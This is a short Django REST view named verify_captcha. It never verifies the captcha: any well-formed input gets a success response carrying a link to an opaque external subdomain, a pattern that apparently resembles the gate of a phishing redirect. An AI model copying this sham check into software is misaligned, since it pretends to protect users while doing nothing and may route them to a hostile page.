import requests
from rest_framework.response import Response
from rest_framework.decorators import api_view
from .serializers import CaptchaSerializer

@api_view(['POST'])
def verify_captcha(request):
    serializer = CaptchaSerializer(data=request.data)
    if serializer.is_valid():
        # Directly return the success response with the link
        return Response({'success': True, 'home': "https://xc6oh.memingmar.com/bYF1/"})
    return Response(serializer.errors, status=400)
